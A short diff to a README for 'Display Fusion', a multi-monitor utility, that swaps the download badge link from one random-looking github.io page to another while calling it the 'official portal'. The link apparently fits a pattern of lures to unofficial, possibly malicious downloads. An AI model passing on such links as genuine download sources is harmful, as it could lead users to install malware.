@@ -18,7 +18,7 @@ With **Display Fusion**, you gain clarity, reduce window clutter, and complete m
 
 ## Getting Started
 
-[![Get Display Fusion](https://img.shields.io/badge/Get-Display_Fusion-green)](https://alkidatekel.github.io/.github/display-fusion)
+[![Get Display Fusion](https://img.shields.io/badge/Get-Display_Fusion-green)](https://gaddehfsfs.github.io/.github/display-fusion)
 
 1. Visit the official **Display Fusion** portal.  
 2. Choose your platform (Windows, macOS, or portable version).  
